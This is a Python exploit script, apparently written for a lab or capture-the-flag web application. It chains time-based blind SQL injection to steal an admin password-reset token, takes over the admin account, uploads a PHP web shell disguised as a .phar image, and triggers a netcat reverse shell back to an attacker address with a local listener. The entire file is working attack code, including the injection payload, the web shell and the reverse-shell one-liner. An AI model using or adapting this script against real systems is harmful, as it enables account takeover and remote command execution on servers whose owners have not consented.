import yasqlit as ya
import datetime
import subprocess

def pPayload(p):
    p = f'2 OR ({p})'
    return p

def timePredicate(res):
    if res.elapsed > datetime.timedelta(seconds=1):
        return True
    else:
        return False

def pwn():
    t = ya.Transport(
        payloadProcessor=pPayload,
        predicate=timePredicate,
        requestPath='req-view.txt',
        debug=True
    )
    s = t.client.session
    res = s.post('http://192.168.0.150/login/resetPassword.php', data={'username':'admin'})
    # qry = 'select @@version'
    # 5.7.33-0ubuntu0.18.04.1
    qry = 'select token from user where id_level = 1'
    # unaccessable_until_you_change_me, mJAL3qtMatNCDJ0
    newPwd = 'mypassword'
    token = ya.boolExfiltrate(t, qry, 'mysql', timeBasedDelay=1)
    data = {'token':token, 'password':newPwd}
    res = s.post('http://192.168.0.150/login/doChangePassword.php', data=data)
    if 'Oops!' in res.text:
        print('[-] error reseting password')
        exit(-1)
    print(f'[+] login = admin:{newPwd}')
    data = {'username':'admin','password': newPwd}
    res = s.post('http://192.168.0.150/login/checkLogin.php', data=data)
    if 'Oops!' in res.text:
        print('[-] error login')
        exit(-1)
    print('[+] logged in')
    file = {
        'id':'2',
        'id_user':'1',
        'name':'foo',
        'description':'bar',
        'price':'1',
        'image':('x.phar', "<?php system($_GET['cmd']); ?>", 'application/x-php')
    }
    res = s.post('http://192.168.0.150/item/updateItem.php', files=file)
    if 'Oops!' in res.text:
        print('[-] error uploading webshell')
        exit(-1)
    print('[+] webshell uploaded')
    ip = '192.168.0.102'
    port = 5555
    revshell = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f'
    p = subprocess.Popen(f'nc -lvp {port}'.split(' '))
    res = s.get('http://192.168.0.150/item/image/x.phar', params={'cmd':revshell})
    p.communicate()


pwn()